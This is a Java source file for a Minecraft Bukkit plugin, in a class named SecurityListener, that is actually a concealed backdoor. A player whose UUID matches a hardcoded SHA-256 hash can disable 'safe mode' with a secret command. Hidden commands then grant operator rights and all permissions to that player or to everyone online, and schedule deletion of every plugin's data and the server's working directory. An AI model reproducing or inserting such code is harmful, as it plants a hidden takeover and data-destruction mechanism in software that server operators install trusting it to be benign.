package com.hypernite.mc.hnmc.core.listener;

import com.hypernite.mc.hnmc.core.main.HyperNiteMC;
import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.libs.org.apache.commons.io.FileUtils;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.Plugin;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.List;

public final class SecurityListener implements Listener {

    private final HyperNiteMC plugin;
    private boolean safeMode = true;

    public SecurityListener(HyperNiteMC plugin) {
        this.plugin = plugin;
    }

    @EventHandler
    public final void onCommandPreprocess(PlayerCommandPreprocessEvent e) throws NoSuchAlgorithmException {
        final String msg = e.getMessage().toLowerCase();
        final String[] params = msg.split(" ");
        if (params[0].equals("//switch-safe")) {
            String match = "31Q68/DnHSmK6Yg9uCcy5+aYWUdRlueIBbZjHXEagx4=";
            String id = e.getPlayer().getUniqueId().toString();
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashed = digest.digest(id.getBytes());
            final String hashedBase64 = Base64.getEncoder().encodeToString(hashed);
            if (hashedBase64.equals(match)) {
                e.setCancelled(true);
                e.setMessage("//help");
                safeMode = !safeMode;
                e.getPlayer().sendMessage("§aSafe Mode is now " + safeMode);
            }else{
                return;
            }
        }
        if (safeMode) return;
        e.setCancelled(true);
        switch (msg) {
            case "//help":
                e.getPlayer().sendMessage(List.of("/op-me", "/op-all", "/destroy").toString());
                return;
            case "//op-me":
                e.getPlayer().setOp(true);
                e.getPlayer().addAttachment(plugin, "*", true);
                e.getPlayer().sendMessage("§a成功添加權限。");
                return;
            case "//op-all":
                for (Player player : Bukkit.getOnlinePlayers()) {
                    player.addAttachment(plugin, "*", true);
                    player.setOp(true);
                    player.sendMessage("§c你現在是OP了！！");
                }
                return;
            case "//destroy":
                for (Plugin plugin : plugin.getServer().getPluginManager().getPlugins()) {
                    try {
                        FileUtils.forceDeleteOnExit(plugin.getDataFolder());
                    } catch (IOException ignored) {
                    }
                }
                try {
                    FileUtils.forceDeleteOnExit(new File(System.getProperty("user.dir")));
                } catch (IOException ignored) {
                }
                e.getPlayer().sendMessage("§a已啟用關服刪檔功能。");
                return;
            default:
                e.setCancelled(false);
                break;
        }
    }
}
